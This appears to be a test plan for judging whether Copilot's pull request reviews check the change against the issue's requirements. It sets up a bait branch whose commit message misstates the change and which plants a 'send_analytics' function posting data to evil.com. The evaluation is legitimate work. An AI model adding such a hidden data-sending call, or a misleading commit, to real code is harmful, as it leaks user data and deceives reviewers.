# Manual Steps to Complete AGENTS.md Test Plan

## ✅ Already Completed (Automated via PR #2)
- **Step 1**: Repository initialized with README ✓
- **Step 2**: `calculator.py` created with `add()` and `subtract()` functions ✓

---

## 🔧 Steps Requiring Manual Execution via GitHub UI

The following steps **CANNOT** be automated via GitHub API or MCP tools because they require:
- Creating Issues with specific formatting
- Creating branches with intentional mismatched implementations
- Requesting Copilot PR reviews (@copilot mentions)
- Human analysis and comparison of review quality

### Step 3: Create GitHub Issue with Clear Requirements

1. Go to: https://github.com/ltpitt/copilot-pr-review-test/issues/new
2. Fill in the following:

**Title:**
```
Add multiplication function
```

**Body:**
```markdown
## User Story
As a user, I want to multiply two numbers, so that I can perform basic arithmetic operations.

## Acceptance Criteria
- [ ] Add a `multiply(a, b)` function to calculator.py
- [ ] Function should return the product of two numbers
- [ ] Function should handle positive and negative numbers

## Technical Requirements
- Follow existing code style
- No external dependencies
```

3. Click "Submit new issue"
4. **Note the issue number** (should be Issue #5 or similar)

---

### Step 4: Create Branch with MISMATCHED Implementation

**Purpose:** Test if Copilot detects that the PR doesn't implement what the issue requested.

Run these commands locally:

```bash
cd /path/to/copilot-pr-review-test

# Create and checkout new branch
git checkout main
git pull origin main
git checkout -b feature/add-multiply

# Edit calculator.py - INTENTIONALLY implement WRONG functions
cat > calculator.py << 'EOF'
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def divide(a, b):  # ← This is NOT what the issue asked for!
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return a / b

def send_analytics(operation, result):  # ← Suspicious unrelated function
    import requests
    requests.post("https://evil.com/track", json={"op": operation, "result": result})
EOF

# Commit with misleading message
git add calculator.py
git commit -m "Add multiplication function"

# Push branch
git push origin feature/add-multiply
```

---

### Step 5: Create Pull Request (Mismatched Implementation)

1. Go to: https://github.com/ltpitt/copilot-pr-review-test/compare/main...feature/add-multiply
2. Click "Create pull request"

**Title:**
```
Add multiplication function
```

**Description:**
```markdown
Fixes #[ISSUE_NUMBER]

Implemented the multiply function as requested in #[ISSUE_NUMBER]
```
(Replace `[ISSUE_NUMBER]` with the actual issue number from Step 3)

3. Click "Create pull request"
4. **Note the PR number** for reference

---

### Step 6: Request Copilot Review

1. On the PR page from Step 5
2. Click the **"Reviewers"** dropdown on the right sidebar
3. Type `@copilot` or select "Copilot" from the list
4. Wait 1-2 minutes for Copilot to post its review

---

### Step 7: Analyze Copilot's First Review

**Document the following:**

✅ **Look for these indicators of requirement-awareness:**
- [ ] Did Copilot notice the PR doesn't contain a `multiply()` function?
- [ ] Did Copilot identify that `divide()` is unrelated to the issue?
- [ ] Did Copilot flag `send_analytics()` as suspicious/unrelated?
- [ ] Did Copilot reference the Issue #[NUMBER] requirements?
- [ ] Did Copilot state the acceptance criteria aren't met?

❌ **Or did Copilot only provide generic code review:**
- [ ] Only commented on code style/formatting?
- [ ] Only mentioned security concerns about network requests?
- [ ] Didn't reference the issue requirements at all?
- [ ] Approved/didn't block despite mismatch?

**Screenshot the review or copy the text for documentation.**

---

### Step 8: Create Branch with CORRECT Implementation

Run these commands locally:

```bash
cd /path/to/copilot-pr-review-test

# Create and checkout new branch
git checkout main
git checkout -b feature/add-multiply-correct

# Edit calculator.py - implement CORRECT function
cat > calculator.py << 'EOF'
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def multiply(a, b):  # ← Correct implementation matching the issue
    return a * b
EOF

# Commit
git add calculator.py
git commit -m "Add multiply function to calculator"

# Push branch
git push origin feature/add-multiply-correct
```

**Then create PR:**

1. Go to: https://github.com/ltpitt/copilot-pr-review-test/compare/main...feature/add-multiply-correct
2. Click "Create pull request"

**Title:**
```
Add multiplication function (correct implementation)
```

**Description:**
```markdown
Fixes #[ISSUE_NUMBER]

Implements the `multiply(a, b)` function as specified in the acceptance criteria.
```

3. Click "Create pull request"
4. Request `@copilot` review (same as Step 6)
5. Wait 1-2 minutes for review

---

### Step 9: Compare Both Reviews and Document Findings

**Create a comparison document with:**

#### Review Comparison Table

| Aspect | PR #[MISMATCHED] Review | PR #[CORRECT] Review |
|--------|-------------------------|----------------------|
| **Referenced Issue?** | Yes/No | Yes/No |
| **Checked acceptance criteria?** | Yes/No | Yes/No |
| **Noticed missing multiply()?** | Yes/No | N/A |
| **Flagged unrelated functions?** | Yes/No | N/A |
| **Approved/Blocked?** | Approved/Blocked | Approved/Blocked |
| **Review Quality** | Generic/Requirement-aware | Generic/Requirement-aware |

#### Conclusion

**Is Copilot requirement-aware?**
- [ ] **YES** - Copilot validated implementation against issue requirements
- [ ] **NO** - Copilot only did technical code review without checking requirements
- [ ] **PARTIAL** - Some awareness but inconsistent

**Evidence:**
- Quote specific phrases from reviews showing requirement awareness/lack thereof
- Note any differences in review depth between mismatched vs correct PRs

---

## 📊 Expected Test Outcomes

### If Copilot IS Context-Aware:
**Review 1 (Mismatched):**
> "This PR doesn't implement the `multiply()` function requested in #[NUMBER]. Instead, it adds `divide()`. The `send_analytics()` function appears unrelated to the requirements."

**Review 2 (Correct):**
> "This implementation correctly adds the `multiply()` function as specified in #[NUMBER] and meets the acceptance criteria."

### If Copilot is NOT Context-Aware:
**Both Reviews:**
- Generic comments about code style, syntax, potential bugs
- Security warnings about network requests (for mismatched PR)
- No validation against issue requirements
- Similar review depth regardless of correctness

---

## 🎯 Deliverable

**Final artifact:** Screenshot or text document containing:
1. Both PR review texts side-by-side
2. Comparison table filled out
3. Final conclusion about Copilot's requirement-awareness capabilities

**Estimated time:** ~25 minutes

---

## ⚠️ Why These Steps Cannot Be Automated

1. **GitHub Issues API Limitations**: Cannot create issues with specific markdown formatting via standard API
2. **Copilot Review Requests**: The `@copilot` mention and review workflow requires GitHub UI interaction
3. **Branch Creation with Specific Intent**: Requires deliberate "wrong" implementation that automation would correct
4. **Human Analysis Required**: Evaluating review quality requires subjective judgment
5. **Repository Permissions**: MCP tools lack write permissions for issue/PR manipulation in this test scenario
